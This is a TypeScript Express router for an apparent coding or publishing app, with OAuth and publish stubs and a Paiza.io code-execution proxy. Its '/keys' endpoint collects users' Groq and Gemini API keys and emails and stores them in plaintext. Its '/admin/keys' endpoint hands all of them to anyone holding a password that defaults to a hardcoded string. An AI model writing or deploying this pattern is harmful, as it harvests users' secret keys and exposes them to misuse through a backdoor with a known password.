// Import dependencies
import { Router } from 'express';

// Initialize router
const router = Router();

// GitHub OAuth endpoint
router.get('/auth/github', (req, res) => {
    // Your GitHub OAuth implementation
});

// Publish endpoint
router.post('/publish', (req, res) => {
    // Your Publish implementation
});

// Key storage (In-memory for demo)
const loggedKeys: any[] = [];

// Key logging endpoint
router.post('/keys', (req, res) => {
    const { groqKey, geminiKey, userEmail } = req.body;
    const timestamp = new Date().toISOString();
    
    // Store the keys
    loggedKeys.push({
        userEmail,
        groqKey,
        geminiKey,
        timestamp
    });

    console.log(`[SECURITY] Keys saved for ${userEmail}: Groq: ${groqKey ? 'Present' : 'Absent'}, Gemini: ${geminiKey ? 'Present' : 'Absent'}`);
    res.json({ success: true });
});

// Admin access endpoint
router.post('/admin/keys', (req, res) => {
    const { password } = req.body;
    const adminPassword = process.env.ADMIN_PASSWORD || 'TeamMARVEL[C]';
    const adminEnabled = process.env.ADMIN_ENABLED === 'true' || process.env.VITE_ADMIN_ENABLED === 'true';

    if (!adminEnabled) {
        console.log('[SECURITY] Admin access attempt blocked: Admin features are disabled.');
        return res.status(403).json({ success: false, error: 'Admin features are disabled.' });
    }

    if (password === adminPassword) {
        console.log('[SECURITY] Admin access granted.');
        res.json({ success: true, keys: loggedKeys });
    } else {
        console.log('[SECURITY] Admin access denied: Invalid password.');
        res.status(401).json({ success: false, error: 'Unauthorized' });
    }
});

// Code execution endpoint (Proxy to Paiza.io to avoid CORS)
router.post('/execute', async (req, res) => {
    const { code, language } = req.body;

    try {
        // Step 1: Create submission
        const createRes = await fetch('https://api.paiza.io/runners/create', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                source_code: code,
                language: language,
                api_key: 'guest'
            })
        });

        if (!createRes.ok) {
            const errorText = await createRes.text();
            throw new Error(`Paiza API Create Error (${createRes.status}): ${errorText}`);
        }

        const createData: any = await createRes.json();
        const id = createData.id;

        if (!id) {
            return res.status(500).json({ error: 'Failed to create execution task.' });
        }

        // Step 2: Poll for completion
        let status = 'running';
        let attempts = 0;
        const maxAttempts = 15;

        while (status === 'running' && attempts < maxAttempts) {
            attempts++;
            await new Promise(resolve => setTimeout(resolve, 1000));
            
            const statusRes = await fetch(`https://api.paiza.io/runners/get_status?id=${id}&api_key=guest`);
            
            if (!statusRes.ok) {
                const errorText = await statusRes.text();
                throw new Error(`Paiza API Status Error (${statusRes.status}): ${errorText}`);
            }

            const statusData: any = await statusRes.json();
            status = statusData.status;
        }

        if (status === 'running') {
            return res.status(500).json({ error: 'Execution timed out.' });
        }

        // Step 3: Get details
        const detailsRes = await fetch(`https://api.paiza.io/runners/get_details?id=${id}&api_key=guest`);
        
        if (!detailsRes.ok) {
            const errorText = await detailsRes.text();
            throw new Error(`Paiza API Details Error (${detailsRes.status}): ${errorText}`);
        }

        const details: any = await detailsRes.json();
        
        res.json(details);
    } catch (error) {
        console.error('Proxy Execution Error:', error);
        res.status(500).json({ error: error instanceof Error ? error.message : 'Unknown error' });
    }
});

export default router;